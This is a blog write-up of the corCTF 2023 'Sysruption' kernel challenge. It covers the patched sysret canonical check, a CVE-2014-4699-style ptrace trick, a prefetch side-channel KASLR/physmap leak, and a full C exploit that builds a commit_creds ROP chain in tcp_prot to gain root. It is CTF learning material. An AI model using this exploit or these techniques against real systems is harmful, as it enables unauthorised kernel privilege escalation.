---
title: "A simple and hard challenge for micro-arch, kernel exploitation, and syscall: Sysruption (corCTF 2023)"
date: 2024-09-28 19:13:31
tags: 
layout: post
---
# 0x00. Prologue

This is a cool challenge in corCTF 2023, related to micro-arch and kernel. This is just a write-up of reproducing. I also recommend you to read some better writeups from the [author][0] and zolutal's [write up][1], who got the first blood in the game. Btw, you can get the initial attachment from this [repo][2].


For this challenge there is nothing to kernel heap and other general exploitation methods. It's a very simple but hard challenge. Everyone with the knowledge of ROP should have a try.

I learned a lot of new stuff from it and gained a better understanding of `syscall` and `interuptions`. 

# 0x01. Prerequisite 

- How to do ROP in linux kernel?
  - Read and try [article 1][3], [article 2][4], and [article 3][5]. 
- What's MicroArch and Sidechannel attack
  - Try start with [these challenges][6] from zolutal
  - Try [Entry Bleed / CVE-2022-4543][7]: Leak PHYSMAP and make it stable when `pti=off`
- Read the source code of SYSCALL
  - Read the [source code][8] of `entry_SYSCALL_64`

# 0x01. Challenge

There is a diff file in the challenge modified the kernel:
```c
--- orig_entry_64.S
+++ linux-6.3.4/arch/x86/entry/entry_64.S
@@ -150,13 +150,13 @@
 	ALTERNATIVE "shl $(64 - 48), %rcx; sar $(64 - 48), %rcx", \
 		"shl $(64 - 57), %rcx; sar $(64 - 57), %rcx", X86_FEATURE_LA57
 #else
-	shl	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
-	sar	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
+	# shl	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
+	# sar	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
 #endif
 
 	/* If this changed %rcx, it was not canonical */
-	cmpq	%rcx, %r11
-	jne	swapgs_restore_regs_and_return_to_usermode
+	# cmpq	%rcx, %r11
+	# jne	swapgs_restore_regs_and_return_to_usermode
 
 	cmpq	$__USER_CS, CS(%rsp)		/* CS must match SYSRET */
 	jne	swapgs_restore_regs_and_return_to_usermode
```

In the modifications, several lines are deleted and we see they are in the function `entry_SYSCALL_64`, which is the entry of all the syscalls to the kernel.

After reading the source code of the function, I learned that the original lines are used to avoid some cases using `sysret` path, which has fewer checks than `iret` path.

I searched the key words online and found the original bug of this challenge: [CVE-2014-4699][9]. In the article, I learned that we are able to use `ptrace` and `PTRACE_O_TRACEFORK` to create a case that the the return RIP is a non-canonical address. I found an old [exploit][10] script for this CVE online. 


In the exploit, it shows the way to use `PTRACE_O_TRACEFORK` to perform control flow hijacking. Basically, based on this vulnerability, we have the permit to leave some data in the kernel. However, it attacked `idt` table, which is read-only in recent linux kernels. We have to attack other writeable places. Therefore, the first problem is leaking.

# 0x02. Leaking

Considering the challeng uses `host` cpu and it mentions microarch in the challenge description, I tried to leak the address by side-channel attack.

```sh
#!/bin/sh
qemu-system-x86_64 \
    -m 4096M \
    -smp 1 \
    -nographic \
    -kernel "./bzImage" \
    -append "console=ttyS0 loglevel=3 panic=-1 pti=off kaslr" \
    -no-reboot \
    -monitor /dev/null \
    -cpu host \
    -netdev user,id=net \
    -device e1000,netdev=net \
    -initrd "./initramfs.cpio.gz" \
    -enable-kvm -s
```
I knew entry-bleed before starting this challenge and using others' exploit script is easy. However, I don't want to be a script kid. I try to use the micro-arch knowledge learned from pwn.college and zolutal to build a better one.


Bascially, entry-bleed uses prefetch attack to check if an address is in the cache-line. When we do syscall, some kernel code is triggered and the corresponding area would be loaded into cache-line. Then, the later access would be faster.

Leaking KASLR is easier than PHYSMEM since the search scope is smaller and other reasons(I don't know). But `pti=off` makes it a little harder since the page next to it could also be loaded into the cache. 

After debugging for several days, I made my side-channel prefetch [scrip][11] for both KASLR and PHYSMEM. For KASLR, it has an about 99% success rate while it can leak the PHYSMEM correctly with an about 85% success rate (one trial). It's not the best one but it's good enought for most cases. Don't forget to pinCPU before calling the functions!

# 0x03. Control Flow Hijacking

After we leak the addresses, with the primitive to leak some data, we need to consider about "Where to write". A simple answer is `modprobe_path`, however, if you try it, you'll find it's not such simple since the primitive actually dumped so much stuff to the stack, which polluted some global variables near `modprobe_path`. You can somehow fix these variables and attack successfully like what zolutal did. I'm targeting to learn some new method so sorry Justin, I didn't reproduce your solution. After long time of failing, I read the author's write-up and learned a new variable to attack: `tcp_prot`.



After figuring out what to attack, the left story is simple. Just debug more and read more source code. Btw, don't forget that you can set GS/rflags in user space

# 0x03. Exp

```c
// https://github.com/n132/libx
// gcc ./fs/exp.c -masm=intel -o ./fs/exp -lx -lpthread --static -w
#include "libx.h"
#define PIPE_BUF_FUNC 0xffffffff82427c08
#define DEBUG 0
int     fd       = 1;
size_t  KASLR    = 0;
size_t  PHYS     = 0;
int main()
{

    saveStatus();
    hook_segfault();

    if(! DEBUG){
        KASLR = leakKASLR(0,0x800000,0);
        PHYS = leakPHYS(0);
        warn(hex(KASLR));
        warn(hex(PHYS));
    }else{
        KASLR = 0xffffffff81000000;
        PHYS = 0xffff888000000000;
    }

    fd = socket(AF_INET, SOCK_STREAM, 0);
    int pid = fork();
    if(!pid){
        ptrace(PTRACE_TRACEME, 0, 0, 0);
        kill(getpid(), SIGSTOP); 
        set_gs_base(0xffff88813bc00000-0xffff888000000000+PHYS);
        fork();
        exit(1);
    }
    else{
        struct user_regs_struct regs;
        int status;      
        waitpid(pid, &status, 0);
        if (ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACEFORK) == -1)
            panic("ptrace(PTRACE_SETOPTIONS)");
        
        // debug();
        ptrace(PTRACE_CONT, pid, 0, 0);

        pid = waitpid(-1, &status, 0);
        if (pid == -1) {
            perror("waitpid");
            return;
        }
        
        ptrace(PTRACE_GETREGS, pid, NULL, &regs);

        size_t non_canonical= 0xdddddddddddddddd;
        size_t init_cred    = 0xffffffff8203ade0 - 0xffffffff81000000 + KASLR;
        size_t commit_creds = 0xffffffff8109b810 - 0xffffffff81000000 + KASLR;
        size_t rdi          = 0xffffffff815deabd - 0xffffffff81000000 + KASLR;
        size_t prot         = 0xffffffff82160180 - 0xffffffff81000000 + KASLR;
        size_t swap_gs      = 0xffffffff81a00f46 - 0xffffffff81000000 + KASLR;
        size_t gadget       = 0xffffffff817bf06b - 0xffffffff81000000 + KASLR;

        regs.rdi = 0xdeadbeefdeadeee0;
        regs.rip = non_canonical;
        regs.rsp = prot+0xb0;
        regs.rdi = prot+0x8;            // RSP
        regs.rsi = 0xdeadbeef0000000a;          
        regs.rdx = 0xdeadbeef00000009;          
        regs.rcx = non_canonical;       // ROP11 && must be non-canonical && same as regs.rip
        regs.rax = 0xdeadbeef00000007;
        regs.r8  = 0xdeadbeef00000006;          
        regs.r9  = gadget;              // RIP
        regs.r10 = user_sp;  // ROP7
        regs.r11 = user_rflags;         // ROP6
        regs.rbx = user_cs;             // ROP5
        regs.rbp = main;                // ROP4
        regs.r12 = swap_gs;             // ROP3
        regs.r13 = commit_creds;        // ROP2
        regs.r14 = init_cred;           // ROP1
        regs.r15 = rdi;                 // ROP0

        // debug();
        ptrace(PTRACE_SETREGS, pid, NULL, &regs);
        ptrace(PTRACE_CONT, pid, 0, 0);
        ptrace(PTRACE_DETACH, pid, 0, 0);
        sleep(1);

        setsockopt(fd, SOL_TCP, 0x99999999, prot+120, 0x99999999);
        success("WTF");
    }
}
```


# 0x04. Epilogue

This chal is so different from the kernel challenge I solved since it forcus on more basic things instead of kernel heap. I learned so much about these basic things, including:    
- `syscalls`, `sysret`, `ireq`, 
- idt: `#gp`, `#df`
- Prefetch attach and `pti`
- Setting `$GS` in user land
- Use `tcp_prot` to get control flow hijacking

This challenge seems simple but it requires so much knowledge. I spent 10 days on that. Thank all the people who helped me in the last 10 days: Justin, P0ch1ta, and Kyle. Also, thank Will so much for the challenge. 


[0]: https://www.willsroot.io/2023/08/sysruption.html
[1]: https://zolutal.github.io/corctf-sysruption/
[2]: https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/pwn/sysruption
[3]: https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/
[4]: https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/
[5]: https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/
[6]: https://pwn.college/software-exploitation/speculative-execution/
[7]: https://www.willsroot.io/2022/12/entrybleed.html
[8]: https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/entry/entry_64.S
[9]: https://duasynt.com/blog/cve-2014-4699-linux-kernel-ptrace-sysret-analysis
[10]: https://github.com/infinite-horizon219/Unix-Privilege-Escalation-Exploits-Pack/blob/master/2014/CVE-2014-4699.c
[11]: https://github.com/n132/libx/blob/main/kaslr.c